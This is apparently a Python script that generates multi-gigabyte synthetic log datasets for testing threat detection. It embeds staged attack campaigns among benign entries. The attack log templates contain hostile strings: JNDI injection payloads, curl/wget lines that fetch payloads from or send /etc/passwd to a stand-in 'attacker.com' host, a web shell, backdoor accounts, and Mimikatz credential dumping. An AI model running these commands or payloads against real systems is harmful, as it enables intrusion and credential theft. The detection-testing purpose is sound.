#!/usr/bin/env python3
"""
Large-Scale Test Data Generator

Generates 5-10GB of realistic log data with embedded APT campaigns for high-fidelity testing.

Features:
- Realistic benign traffic (web requests, database queries, system logs)
- Multiple embedded APT campaigns spanning days/weeks
- Configurable data size and APT density
- JSON streaming output for memory efficiency
"""

import json
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Dict, Any
import argparse

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))


class LogGenerator:
    """Generates realistic log entries"""

    def __init__(self):
        """Initialize log generator"""
        self.web_paths = [
            "/index.html", "/api/users", "/api/products", "/api/orders",
            "/login", "/logout", "/dashboard", "/settings", "/profile",
            "/search", "/contact", "/about", "/help", "/docs",
            "/api/v1/health", "/api/v1/status", "/metrics", "/favicon.ico"
        ]

        self.http_methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
        self.http_codes = [200, 200, 200, 200, 201, 204, 301, 302, 400, 401, 403, 404, 500]

        self.sql_queries = [
            "SELECT * FROM users WHERE id = {}",
            "SELECT COUNT(*) FROM orders WHERE status = 'completed'",
            "INSERT INTO logs (timestamp, message) VALUES ('{}', '{}')",
            "UPDATE users SET last_login = '{}' WHERE id = {}",
            "DELETE FROM sessions WHERE expired_at < '{}'",
            "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
            "SELECT * FROM products WHERE category = '{}' LIMIT 10",
            "UPDATE inventory SET quantity = quantity - 1 WHERE product_id = {}"
        ]

        self.system_messages = [
            "Application started successfully on port {}",
            "Database connection pool initialized with {} connections",
            "Cache hit rate: {}%",
            "Background job completed in {} seconds",
            "User {} logged in from {}",
            "File uploaded: {} size={}KB",
            "Email sent to {}",
            "Backup completed successfully: {}GB backed up",
            "Memory usage: {}MB / {}MB",
            "CPU usage: {}%",
            "Request processed in {}ms",
            "Session created for user {}",
            "Password reset requested for {}",
            "API rate limit exceeded for IP {}",
            "Scheduled task completed: {}"
        ]

        self.usernames = [
            "john.doe", "jane.smith", "bob.johnson", "alice.williams", "charlie.brown",
            "diana.davis", "evan.miller", "frank.wilson", "grace.moore", "henry.taylor",
            "isabel.anderson", "jack.thomas", "karen.jackson", "louis.white", "mary.harris"
        ]

        self.domains = [
            "example.com", "company.org", "enterprise.net", "business.io", "service.co"
        ]

        # Generate IP ranges
        self.benign_ips = [f"192.168.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(100)]
        self.external_ips = [f"203.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(50)]

    def generate_benign_log(self, timestamp: str, source_ip: str = None) -> Dict[str, Any]:
        """Generate a realistic benign log entry"""
        log_type = random.choices(
            ['web', 'database', 'system', 'application'],
            weights=[40, 20, 20, 20]
        )[0]

        if source_ip is None:
            source_ip = random.choice(self.benign_ips)

        if log_type == 'web':
            method = random.choice(self.http_methods)
            path = random.choice(self.web_paths)
            code = random.choice(self.http_codes)
            log_text = f"{method} {path} HTTP/1.1 {code} OK"

        elif log_type == 'database':
            query = random.choice(self.sql_queries)
            params = [random.randint(1, 1000), random.choice(['active', 'completed', 'pending'])]
            log_text = f"SQL: {query.format(*params)}"

        elif log_type == 'system':
            msg = random.choice(self.system_messages)
            params = [random.randint(1, 100) for _ in range(3)]
            log_text = f"INFO {msg.format(*params)}"

        else:  # application
            log_text = f"DEBUG Processing request for user {random.choice(self.usernames)}"

        return {
            'timestamp': timestamp,
            'source_ip': source_ip,
            'target': f'server-{random.randint(1,20)}',
            'log': log_text,
            'category': 'benign'
        }


class APTCampaignGenerator:
    """Generates realistic APT campaign scenarios"""

    def __init__(self):
        """Initialize APT campaign generator"""
        # Define APT scenarios based on CVE signatures
        self.apt_scenarios = {
            'log4shell': {
                'cve': 'CVE-2021-44228',
                'name': 'Log4Shell Campaign',
                'stages': [
                    {
                        'stage': 1,
                        'patterns': [
                            'GET /api/search?query=${{jndi:ldap://{}/exploit}} HTTP/1.1',
                            'POST /login username=${{jndi:ldap://{}/shell}} HTTP/1.1',
                            'GET /search?q=${{jndi:rmi://{}/payload}} HTTP/1.1',
                            'POST /api/data body=${{jndi:dns://{}/callback}} HTTP/1.1'
                        ],
                        'delay_hours': (24, 72)  # 1-3 days to next stage
                    },
                    {
                        'stage': 2,
                        'patterns': [
                            'Process executed: Runtime.exec("/bin/bash -c wget http://{}/payload.sh")',
                            'Java payload detected: ProcessBuilder("/bin/sh", "-c", "curl http://{}/backdoor")',
                            'Command injection: Runtime.exec("powershell.exe -c wget http://{}/malware.exe")',
                            'Shell command: Runtime.exec("cmd.exe /c curl http://{}/dropper.bat")'
                        ],
                        'delay_hours': (120, 240)  # 5-10 days to next stage
                    },
                    {
                        'stage': 3,
                        'patterns': [
                            'Modified crontab detected: @reboot /tmp/.hidden/backdoor.sh',
                            'Systemd service created: systemctl enable malicious.service',
                            'Scheduled task: schtasks /create /tn "Updater" /tr "C:\\\\temp\\\\update.exe"',
                            'Registry modification: reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'
                        ],
                        'delay_hours': (168, 336)  # 7-14 days to next stage
                    },
                    {
                        'stage': 4,
                        'patterns': [
                            'Outbound connection: POST http://{}/exfil data=user_database.sql',
                            'Data exfiltration: curl -X POST http://{}/upload -F file=@/etc/passwd',
                            'Network transfer: scp -r /var/www/data {}:/tmp/',
                            'Archive created: tar czf /tmp/exfil.tar.gz /home/*/Documents'
                        ],
                        'delay_hours': (24, 72)
                    }
                ]
            },
            'eternalblue': {
                'cve': 'CVE-2017-0144',
                'name': 'EternalBlue Ransomware',
                'stages': [
                    {
                        'stage': 1,
                        'patterns': [
                            'SMB1 connection to \\\\\\\\{}\\\\PIPE\\\\samr detected',
                            'SMB exploit attempt: NT_STATUS_INSUFF_SERVER_RESOURCES from {}',
                            'SMB2_TREE_CONNECT anomaly from {}',
                            'PeekNamedPipe vulnerability scan from {}'
                        ],
                        'delay_hours': (12, 48)
                    },
                    {
                        'stage': 2,
                        'patterns': [
                            'Process created: psexec \\\\\\\\{} cmd.exe /c net user attacker Pass123! /add',
                            'Remote execution: wmic /node:{} process call create "cmd.exe /c whoami"',
                            'Service creation: sc \\\\\\\\{} create backdoor binPath= "C:\\\\Windows\\\\temp\\\\service.exe"',
                            'Account created: net user /add hacker P@ssw0rd123 on {}'
                        ],
                        'delay_hours': (48, 120)
                    },
                    {
                        'stage': 3,
                        'patterns': [
                            'File encrypted: document.docx.locked on {}',
                            'Ransomware note created: README_DECRYPT.txt on {}',
                            'Mass file encryption: 1500 files encrypted on {}',
                            'Bitcoin ransom demand: PAY 0.5 BTC TO {} FOR DECRYPTION'
                        ],
                        'delay_hours': (0, 24)
                    }
                ]
            },
            'zerologon': {
                'cve': 'CVE-2020-1472',
                'name': 'Zerologon Domain Takeover',
                'stages': [
                    {
                        'stage': 1,
                        'patterns': [
                            'Netlogon authentication bypass: NetrServerAuthenticate3 with zero challenge from {}',
                            'DC vulnerability scan: NetrServerReqChallenge anomaly from {}',
                            'Netlogon exploit attempt from {} to domain controller',
                            'DCERPC Netlogon call with invalid credentials from {}'
                        ],
                        'delay_hours': (6, 24)
                    },
                    {
                        'stage': 2,
                        'patterns': [
                            'DCSync attack: DsGetNCChanges requesting krbtgt hash from {}',
                            'Domain credential dump: DRSUAPI call for all user hashes from {}',
                            'Mimikatz detected: lsadump::dcsync /domain:{} /user:krbtgt',
                            'secretsdump.py execution targeting {} domain controller'
                        ],
                        'delay_hours': (24, 72)
                    },
                    {
                        'stage': 3,
                        'patterns': [
                            'Golden Ticket created: krbtgt hash used for TGT generation by {}',
                            'Domain Admin access: {} logged in with compromised credentials',
                            'Enterprise Admin login: {} accessing all domain controllers',
                            'Privileged account abuse: {} member of Domain Admins'
                        ],
                        'delay_hours': (12, 48)
                    }
                ]
            },
            'proxylogon': {
                'cve': 'CVE-2021-26855',
                'name': 'ProxyLogon Exchange Attack',
                'stages': [
                    {
                        'stage': 1,
                        'patterns': [
                            'Exchange SSRF: GET /ecp/DDI/DDIService.svc/GetList X-AnonResource-Backend:{} HTTP/1.1',
                            'ProxyLogon exploit: POST /owa/auth/ X-BEResource:{} HTTP/1.1',
                            'Exchange vulnerability: GET /autodiscover/autodiscover.json?@{}/owa/ HTTP/1.1',
                            'SSRF attempt: GET /mapi/emsmdb X-BEResource:{} HTTP/1.1'
                        ],
                        'delay_hours': (12, 36)
                    },
                    {
                        'stage': 2,
                        'patterns': [
                            'Web shell detected: POST /owa/auth/temp.aspx code=eval(Request["cmd"]) from {}',
                            'ASPX backdoor: china chopper detected in {} Exchange directory',
                            'Web shell upload: POST /aspnet_client/system_web/shell.aspx from {}',
                            'Malicious ASPX: System.Diagnostics.Process execution in {} web root'
                        ],
                        'delay_hours': (48, 120)
                    },
                    {
                        'stage': 3,
                        'patterns': [
                            'LSASS dump: procdump64.exe targeting lsass.exe from {}',
                            'Credential theft: comsvcs.dll MiniDumpWriteDump on lsass from {}',
                            'Memory dump: Task Manager used to dump lsass.exe on {}',
                            'Credential access: Mimikatz sekurlsa::logonpasswords on {}'
                        ],
                        'delay_hours': (24, 72)
                    }
                ]
            }
        }

    def generate_apt_campaign(
        self,
        scenario: str,
        start_time: datetime,
        attacker_ip: str,
        target_asset: str
    ) -> List[Dict[str, Any]]:
        """
        Generate a complete APT campaign

        Args:
            scenario: APT scenario name
            start_time: Campaign start time
            attacker_ip: Attacker IP address
            target_asset: Target asset name

        Returns:
            List of log entries for the campaign
        """
        campaign = self.apt_scenarios[scenario]
        logs = []
        current_time = start_time

        # Generate logs for each stage
        for stage_info in campaign['stages']:
            stage = stage_info['stage']
            patterns = stage_info['patterns']

            # Generate 1-3 attempts for this stage
            num_attempts = random.randint(1, 3)

            for attempt in range(num_attempts):
                # Choose a pattern
                pattern = random.choice(patterns)

                # Fill in placeholders
                c2_domain = f"c2-{random.randint(1000,9999)}.attacker.com"
                pattern = pattern.format(c2_domain, attacker_ip, target_asset)

                log = {
                    'timestamp': current_time.isoformat() + 'Z',
                    'source_ip': attacker_ip,
                    'target': target_asset,
                    'log': pattern,
                    'category': 'malicious',
                    'cve': campaign['cve'],
                    'campaign': campaign['name'],
                    'stage': stage
                }

                logs.append(log)

                # Small delay between attempts
                current_time += timedelta(minutes=random.randint(5, 60))

            # Delay before next stage
            if stage < len(campaign['stages']):
                delay_hours = random.randint(*stage_info['delay_hours'])
                current_time += timedelta(hours=delay_hours)

        return logs


def generate_large_dataset(
    output_path: str,
    target_size_gb: float = 5.0,
    num_apt_campaigns: int = 50,
    apt_density: float = 0.001  # 0.1% of logs are APT-related
):
    """
    Generate large-scale test dataset

    Args:
        output_path: Output file path
        target_size_gb: Target file size in GB
        num_apt_campaigns: Number of APT campaigns to embed
        apt_density: Proportion of malicious logs (0.001 = 0.1%)
    """
    print(f"\n{'='*70}")
    print(f"LARGE-SCALE TEST DATA GENERATOR")
    print(f"{'='*70}")
    print(f"Target size: {target_size_gb:.1f} GB")
    print(f"APT campaigns: {num_apt_campaigns}")
    print(f"APT density: {apt_density:.3%}")
    print(f"Output: {output_path}")
    print(f"{'='*70}\n")

    log_gen = LogGenerator()
    apt_gen = APTCampaignGenerator()

    # Estimate logs needed (avg ~500 bytes per log)
    target_bytes = target_size_gb * 1024 * 1024 * 1024
    estimated_logs = int(target_bytes / 500)
    malicious_logs = int(estimated_logs * apt_density)
    benign_logs = estimated_logs - malicious_logs

    print(f"Estimated logs: {estimated_logs:,}")
    print(f"  Benign: {benign_logs:,}")
    print(f"  Malicious: {malicious_logs:,}")
    print()

    # Generate APT campaigns
    print("Generating APT campaigns...")
    apt_scenarios = ['log4shell', 'eternalblue', 'zerologon', 'proxylogon']
    all_apt_logs = []

    start_date = datetime(2024, 1, 1, 0, 0, 0)

    for i in range(num_apt_campaigns):
        scenario = random.choice(apt_scenarios)
        campaign_start = start_date + timedelta(days=random.randint(0, 300))
        attacker_ip = f"10.{random.randint(0,255)}.{random.randint(1,50)}.{random.randint(1,255)}"
        target = f"server-{random.randint(1,100)}"

        campaign_logs = apt_gen.generate_apt_campaign(scenario, campaign_start, attacker_ip, target)
        all_apt_logs.extend(campaign_logs)

        if (i + 1) % 10 == 0:
            print(f"  Generated {i + 1}/{num_apt_campaigns} campaigns...")

    print(f"Generated {len(all_apt_logs):,} malicious logs from {num_apt_campaigns} campaigns")
    print()

    # Write logs to file
    print("Writing logs to file...")
    print("This may take several minutes...")
    print()

    current_size = 0
    logs_written = 0
    apt_index = 0

    with open(output_path, 'w') as f:
        f.write('[\n')  # Start JSON array

        # Interleave APT logs with benign logs
        for i in range(estimated_logs):
            # Decide if this should be an APT log
            if apt_index < len(all_apt_logs) and random.random() < apt_density * 10:
                # Use APT log
                log = all_apt_logs[apt_index]
                apt_index += 1
            else:
                # Generate benign log
                timestamp = (start_date + timedelta(seconds=i*10)).isoformat() + 'Z'
                log = log_gen.generate_benign_log(timestamp)

            # Write log
            json_str = json.dumps(log, indent=2)
            if i > 0:
                f.write(',\n')
            f.write(json_str)

            logs_written += 1
            current_size += len(json_str)

            # Progress indicator
            if logs_written % 100000 == 0:
                size_mb = current_size / 1024 / 1024
                progress = (current_size / target_bytes) * 100
                print(f"  Progress: {logs_written:,} logs | {size_mb:.1f} MB | {progress:.1f}%")

            # Check if we've reached target size
            if current_size >= target_bytes:
                break

        f.write('\n]')  # End JSON array

    final_size_gb = current_size / 1024 / 1024 / 1024

    print(f"\n{'='*70}")
    print("GENERATION COMPLETE")
    print(f"{'='*70}")
    print(f"File: {output_path}")
    print(f"Size: {final_size_gb:.2f} GB")
    print(f"Total logs: {logs_written:,}")
    print(f"APT logs embedded: {apt_index:,}")
    print(f"APT campaigns: {num_apt_campaigns}")
    print(f"{'='*70}\n")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Generate large-scale test dataset with embedded APT campaigns'
    )

    parser.add_argument(
        '--size',
        type=float,
        default=5.0,
        help='Target dataset size in GB (default: 5.0)'
    )

    parser.add_argument(
        '--campaigns',
        type=int,
        default=50,
        help='Number of APT campaigns to embed (default: 50)'
    )

    parser.add_argument(
        '--density',
        type=float,
        default=0.001,
        help='APT log density as proportion (default: 0.001 = 0.1%%)'
    )

    parser.add_argument(
        '--output',
        type=str,
        default='data/test_logs/large_dataset.json',
        help='Output file path (default: data/test_logs/large_dataset.json)'
    )

    args = parser.parse_args()

    # Validate arguments
    if args.size <= 0 or args.size > 100:
        print("Error: Size must be between 0 and 100 GB")
        return

    if args.campaigns <= 0:
        print("Error: Number of campaigns must be positive")
        return

    if args.density <= 0 or args.density > 0.1:
        print("Error: Density must be between 0 and 0.1 (10%)")
        return

    # Generate dataset
    output_path = Path(__file__).parent.parent / args.output
    output_path.parent.mkdir(parents=True, exist_ok=True)

    generate_large_dataset(
        output_path=str(output_path),
        target_size_gb=args.size,
        num_apt_campaigns=args.campaigns,
        apt_density=args.density
    )


if __name__ == "__main__":
    main()
